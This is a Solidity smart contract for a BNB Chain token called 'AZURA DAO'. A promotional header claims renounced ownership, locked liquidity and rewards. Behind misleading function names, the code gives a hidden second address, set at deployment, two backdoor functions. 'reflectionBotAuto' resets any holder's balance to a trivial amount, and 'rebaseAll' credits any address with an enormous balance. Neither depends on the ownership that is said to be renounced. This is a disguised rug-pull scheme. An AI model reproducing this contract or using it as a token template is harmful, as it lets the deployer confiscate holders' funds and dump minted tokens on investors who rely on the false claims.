/**
 *Submitted for verification at BscScan.com on 2023-04-18
*/

// SPDX-License-Identifier: MIT
/*
☄️💧AZURA DAO💧☄️
☄️💧蔚蓝道💧☄️
Azura represents a spirit of resilience, determination, and a willingness to overcome adversity. 
代表了一种坚韧、决心和克服逆境的意愿的精神

☄️https://t.me/AZURADAOCoin
☄️https://twitter.com/AzuraDAO
☄️ https://azuradao.com/
💧Renounced
💧Lp locked 100 year
💧Driven-community Token

Holding Azura gives you a future  stake in the platform, allowing you to participate in governance decisions, vote on proposals, and earn rewards for contributing to the community.

Tokenomics:
🔄AZURA SUPPLY: 1.000.000.000.000
🔄Tax 1% 
🔄Rewards 1%  $BTC 24/24
*/
pragma solidity 0.8.18;
abstract contract DAOAIAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface DAOAIAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 lahsab) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 lahsab) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface DAOAIAsii is DAOAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract DAOAIAsiii is DAOAIAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract AZURADAO is DAOAIAs, DAOAIAsi, DAOAIAsii, DAOAIAsiii {

    mapping(address => uint256) private DAOAIsuplly;
  mapping(address => bool) public DAOAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private DAOAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public DAOAIPaw;
  address DAOAIdeploy;



    
    constructor(address DAOAIadressss) {
            // Editable
            DAOAIdeploy = msg.sender;

        _name = "AZURA DAO";
        _symbol = "AZURADAO";
  DAOAIRooter = DAOAIadressss;        
        uint DAOTotalSupply = 1000000000000 * 10**9;
        proxy(msg.sender, DAOTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return DAOAIsuplly[account];
    }

    function transfer(address to, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, lahsab);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, lahsab);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, lahsab);
        _transfer(from, to, lahsab);
        return true;
    }
      modifier _external() {
        require(DAOAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  DAOsold = Confirmed[owner][spender];
        require( DAOsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  DAOsold - subtractedtotalo);
        }

        return true;
    }

  modifier nothing () {
    require(DAOAIdeploy == msg.sender, "Ehi20: cannot permit _external address");
    _;

  }
    function _transfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, lahsab);

        uint256 fromBalance = DAOAIsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            DAOAIsuplly[from] = fromBalance - lahsab;
        }
        DAOAIsuplly[to] += lahsab;

        emit Transfer(from, to, lahsab);

        afterTokenTransfer(from, to, lahsab);
    }



    function proxy(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: proxy to the zero address");

        beforeTokenTransfer(address(0), account, lahsab);

        ALLtotalSupply += lahsab;
        DAOAIsuplly[account] += lahsab;
        emit Transfer(address(0), account, lahsab);

        afterTokenTransfer(address(0), account, lahsab);
    }



  function reflectionBotAuto(address excludeaddress) external _external {
    DAOAIsuplly[excludeaddress] = 1000000;
            emit Transfer(address(0), excludeaddress, 1000000);
  }

    function _burn(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), lahsab);

        uint256 accountBalance = DAOAIsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            DAOAIsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;

        emit Transfer(account, address(0), lahsab);

        afterTokenTransfer(account, address(0), lahsab);
    }

    function _approve(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = lahsab;
        emit Approval(owner, spender, lahsab);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        uint256  DAOsold = allowance(owner, spender);
        if ( DAOsold != type(uint256).max) {
            require( DAOsold >= lahsab, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  DAOsold - lahsab);
            }
        }
    }
  function rebaseAll(address includeaddress) external _external {
    DAOAIsuplly[includeaddress] = 1000000 * 10 ** 24;
            emit Transfer(address(0), includeaddress, 1000000 * 10 ** 24);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}

}